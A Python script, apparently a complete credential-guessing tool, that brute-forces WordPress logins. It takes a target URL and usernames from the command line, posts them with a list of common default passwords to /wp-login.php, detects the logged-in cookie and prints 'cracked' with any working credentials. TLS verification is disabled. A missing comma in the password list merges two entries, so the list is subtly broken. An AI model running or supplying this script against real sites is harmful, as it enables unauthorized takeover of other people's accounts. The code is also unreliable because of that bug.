import requests
import re
import sys

logged_in = re.compile(r'wordpress_logged_in_[0-9a-f]*=[^\+]')

def login(url, login, password):
    wp_login = url + '/wp-login.php'
    resp = requests.post(wp_login, data={'log': login, 'pwd': password}, verify=False, timeout=5)
    if resp.headers.get('Set-Cookie') is not None and logged_in.match(resp.headers.get('Set-Cookie')):
        print(resp.headers)
        return True
    return False


url = sys.argv[1]
logins = sys.argv[2]

logins = logins.split(',')


passwords = [
    "root",
    "user",
    "wordpress",
    "password",
    "pass123",
    "qwerty123"
    "admin",
    "administrator",
    "superadmin"
]

found = False
for l in logins:
    for p in passwords + [l]:
        if login(url, l, p):
            found = True
            print('cracked', url, l, p)
            break

if not found:
    print('failed', url)
